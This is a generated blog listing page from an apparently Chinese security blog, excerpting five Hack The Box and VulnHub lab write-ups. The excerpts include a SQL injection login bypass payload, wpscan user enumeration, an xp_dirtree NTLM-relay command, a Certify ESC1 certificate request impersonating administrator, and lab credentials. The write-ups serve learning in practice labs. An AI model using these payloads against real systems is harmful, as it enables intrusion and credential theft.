@@ -1,0 +1,111 @@
+<!doctype html><html lang=en dir=auto><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="noindex, nofollow"><title>Posts | 养猪日记</title>
+<meta name=keywords content><meta name=description content="Posts - 养猪日记"><meta name=author content="养猪日记"><link rel=canonical href=http://localhost:1313/posts/><link crossorigin=anonymous href=/assets/css/stylesheet.54405a410796490bc874ab6181fac9b675753cc2b91375d8f882566459eca428.css integrity="sha256-VEBaQQeWSQvIdKthgfrJtnV1PMK5E3XY+IJWZFnspCg=" rel="preload stylesheet" as=style><link rel=icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=16x16 href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate type=application/rss+xml href=http://localhost:1313/posts/index.xml><link rel=alternate hreflang=en href=http://localhost:1313/posts/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript></head><body class=list id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=http://localhost:1313/ accesskey=h title="Home (Alt + H)"><img src=http://localhost:1313/apple-touch-icon.png alt aria-label=logo height=35>Home</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=http://localhost:1313/categories/ title=分类><span>分类</span></a></li><li><a href=http://localhost:1313/search/ title=搜索><span>搜索</span></a></li><li><a href=https://github.com/yangzhuzai title=Github><span>Github</span>&nbsp;<svg fill="none" shape-rendering="geometricPrecision" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" viewBox="0 0 24 24" height="12" width="12"><path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"/><path d="M15 3h6v6"/><path d="M10 14 21 3"/></svg></a></li></ul></nav></header><main class=main><header class=page-header><div class=breadcrumbs><a href=http://localhost:1313/>Home</a></div><h1>Posts</h1></header><article class=post-entry><header class=entry-header><h2 class=entry-hint-parent>0X021 Search</h2></header><div class=entry-content><p>端口扫描 获取立足点 值得关注的服务:http、LDAP、smb：
+先看smb:
+接着看ldap：
+剩下的就只有http了，重点关注：用户名与密码，漏洞
+about us是重灾区：
+暂且这样吧：
+用户名枚举：
+枚举失败了：
+但是dirsearch发现了东西：
+但是好像没什么用：
+峰回路转：
+cewl收集的字典发现信息：
+有了用户名，尝试AS-REP Roasting：
+失败了
+只能尝试密码爆破了：
+但是获取策略失败了，也只能试试了：
+密码爆破失败：
+服了，很好，手写体的英语，里面说了密码和用户名：
+发送密码给Hope sharp
+IsolationIsKey?
+哦，这对我的视力和英语都是一个挑战：
+很好，名字的组合也是一个问题：
+提权 机器没有开明显的远程登录端口，如果要登录，那么只能获取管理权限，目前只能围绕着域渗透的思路来进行，先上bloodhound：
+看来主要是集中在这条路线上了：
+...</p></div><footer class=entry-footer><span title='2024-10-11 14:25:59 +0800 CST'>October 11, 2024</span>&nbsp;·&nbsp;1 min&nbsp;·&nbsp;68 words&nbsp;·&nbsp;养猪日记</footer><a class=entry-link aria-label="post link to 0X021 Search" href=http://localhost:1313/posts/htb/0x021-search/></a></article><article class=post-entry><header class=entry-header><h2 class=entry-hint-parent>0x022 billu b0x</h2></header><div class=entry-content><p>端口扫描 getshell 方法一、代码审计 首先有个坑，burp改POST不行，必须得浏览器才能触发文件下载：
+这里可以知道web目录：
+下载登录主页的源码：
+审计：
+我打眼一看是过滤了单引号’ 然后我就尝试了对单引号进行绕过，16进制、base64、两次URL编码都以失败告终，然后这里的判断逻辑是，sql语句查询出来有内容即可。
+最后无奈看了WP
+payload是：
+password: \
+username: or 1=1 #
+带入到代码里面其实是这样的：
+$run='select * from auth where pass=\''.$pass.'\' and uname=\''.$uname.'\'';
+带入后：
+select * from auth where pass='\' and uname='or 1=1 这里要注意，将sql语句和php分开来理解，要不然会比较麻烦，但是不好理解的是，讲道理这里直接让password=or 1=1 #\就可以实现了啊。后面借着phpmyadmin试了一下，可以清楚的看到闭合结果：
+这样就非常好理解了因为这样的闭合方式，’’ and uname=‘成为了password的查询方式，后面没有查询username，而是直接or 1=1，也就是说必须由password传递转义符\，必须由username传递注释符号#
+然后回到登录后的页面，看起来是有文件上传的，但是直接上传被拦截了，好吧，再次代码审计：
+判断文件的代码，白名单，基本无法绕过：
+然后又去看了一下PW，好好好，确实没发现这个地方可能有文件包含，因为数据包中并没有文件后缀，看起来像是传递参数，但是看了一下代码，是文件包含：
+图片马getsgell：
+方法二 开局扫描的时候，没有扫出来phpmy，两个方法解决，1是使用dirb的big.txt，二是使用dirsearch的默认参数即可
+然后在文件包含时，会发现两个php文件，将他们也下载下来：
+...</p></div><footer class=entry-footer><span title='2024-10-11 14:25:59 +0800 CST'>October 11, 2024</span>&nbsp;·&nbsp;1 min&nbsp;·&nbsp;59 words&nbsp;·&nbsp;养猪日记</footer><a class=entry-link aria-label="post link to 0x022 billu b0x" href=http://localhost:1313/posts/vulnhub/0x022-billu-b0x/></a></article><article class=post-entry><header class=entry-header><h2 class=entry-hint-parent>0X022 cascade</h2></header><div class=entry-content><p>端口扫描 端口扫描就出现问题了，不让扫描？
+最开始7000速率不行，改成2000就可以了：
+获取立足点 关键端口开放情况，445、389、3268、5985
+有匿名访问：
+获取了用户名，可以尝试密码喷洒，或者AS-REP Roasting：
+失败了，但是这里面密码喷洒一般很少：
+查看用户所有信息：
+发现密码：
+r.thompson
+rY4n5eva
+winrm登录失败，回头看smb:
+翻查了一圈，把所有东西都下载下来了：
+新用户？
+别的不说，在目前的情况下，我认为这些文件里面，应该是存在登录成功的方式的：
+破解vnc的密码：
+用户名为：
+登陆成功：
+提权 bloodhound：
+好像没路子：
+看看winpe:
+好像没有头绪，应该是得继续信息收集：
+再去使用s.smith登录smb:
+发现db文件：
+发现是sqllite文件：
+...</p></div><footer class=entry-footer><span title='2024-10-11 14:25:59 +0800 CST'>October 11, 2024</span>&nbsp;·&nbsp;1 min&nbsp;·&nbsp;95 words&nbsp;·&nbsp;养猪日记</footer><a class=entry-link aria-label="post link to 0X022 cascade" href=http://localhost:1313/posts/htb/0x022-cascade/></a></article><article class=post-entry><header class=entry-header><h2 class=entry-hint-parent>0x023 DC-2</h2></header><div class=entry-content><p>端口扫描 记得改hosts
+渗透测试 wpscan –url http://dc-2/ –enumerate u
+发现三个用户
+爆破，常规的爆破字典爆不出来：
+翻查了一下网站，作者有提示：
+cewl收集密码：
+爆破成功：
+jerry / adipiscing
+tom / parturient
+登录web成功，但是由于权限不够无法getshell，也是卡了好久，才想起来可以去看看ssh端口：
+提权 这里就有点恶心了，大部分命令不给用：
+提示说让我们切换到jerry用户，然后命令还是不给用，然后我尝试了vi提权的操作，发现是操作对了的，但是我没发现是命令没找到，我淦：
+这里就是命令无法找到了，而不是受限的环境了：
+查看环境变量：
+改变环境变量，理论上这步可以直接输入绝对路径来执行命令，如果你记得所有的命令路径的话：
+export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games
+切换到jerry，sudo提权，有gtfobins没啥好说的：</p></div><footer class=entry-footer><span title='2024-10-11 14:25:59 +0800 CST'>October 11, 2024</span>&nbsp;·&nbsp;1 min&nbsp;·&nbsp;29 words&nbsp;·&nbsp;养猪日记</footer><a class=entry-link aria-label="post link to 0x023 DC-2" href=http://localhost:1313/posts/vulnhub/0x023-dc-2/></a></article><article class=post-entry><header class=entry-header><h2 class=entry-hint-parent>0X023 Escape</h2></header><div class=entry-content><p>端口扫描 获取立足点 值得关注的端口：389，445，1433，5985
+smb发现这个东西：
+发现sqlserver登录方式：
+连接成功：
+看了一圈儿，确实没东西了：
+最后无奈看了wp，属实没想到，sqlserver也能玩儿relay：
+EXEC MASTER.sys.xp_dirtree ‘\10.10.16.12\test’, 1, 1
+很快就破解了：
+可以直接登录winrm:
+bloodhound:
+无法分析出可用的路径：
+winpeass也没能发现什么有用的东西，看了一下wp，呐应该是思路的缺失了，查看sqlserver的日志文件：
+咋说呢，错误日志一般是不会记录错误密码的，但是会记录错误用户：
+感觉还是有点缺乏想象力，这里应该是模仿用户输入错误了密码为用户名，导致日志被记录：
+是远程组的：
+登录看看：
+很好，bloodhound有局限，ADCS的相关内容其实也有了解，但是没想到这一点：
+ESC1：
+.\Certify.exe request /ca:sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:administrator
+复制出来，提取：
+...</p></div><footer class=entry-footer><span title='2024-10-11 14:25:59 +0800 CST'>October 11, 2024</span>&nbsp;·&nbsp;1 min&nbsp;·&nbsp;31 words&nbsp;·&nbsp;养猪日记</footer><a class=entry-link aria-label="post link to 0X023 Escape" href=http://localhost:1313/posts/htb/0x023-escape/></a></article><footer class=page-footer><nav class=pagination><a class=prev href=http://localhost:1313/posts/page/9/>«&nbsp;Prev&nbsp;
+</a><a class=next href=http://localhost:1313/posts/page/11/>Next&nbsp;&nbsp;»</a></nav></footer></main><footer class=footer><span>&copy; 2025 <a href=http://localhost:1313/>养猪日记</a></span> ·
+<span>Powered by
+<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
+        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
+</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>
